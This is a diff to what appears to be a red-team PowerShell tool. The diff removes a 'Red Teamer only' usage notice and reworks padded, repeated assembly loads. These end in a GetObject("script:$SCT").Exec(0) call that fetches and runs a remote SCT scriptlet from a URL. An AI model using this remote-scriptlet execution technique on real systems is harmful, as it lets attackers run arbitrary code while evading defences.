@@ -105,11 +105,8 @@
 $obj = '''
 
 Author Mat harr0ey @harr0ey
-
-   You should accept these of the stipulations 
-1 Powershell is reject manipulate in modules invoke-Confusion!
-2 regarding this permit for the use: pertain for Red Teamer only!
-3 Exit!
+Thank you for visiting us
+! Exit!
 '''
 [void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")
 
@@ -645,19 +642,17 @@ var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
    
     try {
    $SCTAddValue = "$SCT"
-[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
- [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
- [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-  [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-   [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-    [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-     [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-      [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-       [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
         [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-         [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-          [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
-           [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject("script:$SCT").Exec(0)
+        [Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+	[Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+	[Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+	[Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+	[Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+        [Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+	[Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+	[Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
+	
+          [Void] [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject("script:$SCT").Exec(0)
  } Catch {
   throw ' [!] Error: URL SCT COM File ' 
  
